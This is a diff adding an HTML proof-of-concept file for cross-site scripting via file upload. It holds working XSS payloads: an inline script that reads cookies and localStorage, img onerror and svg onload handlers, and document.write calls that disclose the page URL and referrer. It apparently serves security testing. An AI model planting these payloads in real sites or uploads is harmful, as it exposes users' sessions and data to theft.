@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Test File</title>
+</head>
+<body>
+    <h1>🚨 XSS Test File</h1>
+    <p><strong>This file demonstrates XSS via file upload vulnerability!</strong></p>
+    
+    <script>
+        alert('XSS via File Upload!');
+        console.log('XSS executed from uploaded file');
+        
+        // Try to steal cookies (for demonstration)
+        if (document.cookie) {
+            console.log('Cookies:', document.cookie);
+        }
+        
+        // Try to access local storage
+        if (localStorage.length > 0) {
+            console.log('Local Storage:', localStorage);
+        }
+    </script>
+    
+    <p>If you see an alert box, the XSS vulnerability is confirmed!</p>
+    
+    <h2>Additional XSS Tests:</h2>
+    <img src="x" onerror="alert('XSS via img tag')">
+    <svg onload="alert('XSS via SVG')"></svg>
+    
+    <h2>Information Disclosure:</h2>
+    <script>
+        document.write('<p>Current URL: ' + window.location.href + '</p>');
+        document.write('<p>Referrer: ' + document.referrer + '</p>');
+        document.write('<p>User Agent: ' + navigator.userAgent + '</p>');
+    </script>
+</body>
+</html>
